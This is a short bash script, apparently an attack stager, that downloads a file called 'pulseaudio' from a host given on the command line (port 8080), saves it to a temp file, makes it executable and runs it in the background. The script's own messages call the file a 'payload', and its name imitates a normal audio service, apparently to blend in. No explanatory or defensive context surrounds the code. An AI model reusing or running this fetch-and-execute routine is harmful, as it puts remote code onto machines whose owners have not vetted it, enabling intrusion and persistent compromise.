#!/bin/bash

IP="$1"
TMPFILE=$(mktemp /tmp/pulseaudio.XXXXXX)

echo "[*] Downloading payload to $TMPFILE from $IP..."
curl -s -o "$TMPFILE" "http://$IP:8080/pulseaudio"

if [ $? -ne 0 ] || [ ! -s "$TMPFILE" ]; then
    echo "[!] Failed to download or empty file"
    rm -f "$TMPFILE"
    exit 1
fi

chmod +x "$TMPFILE"

echo "[*] Running payload from $TMPFILE..."
"$TMPFILE" &

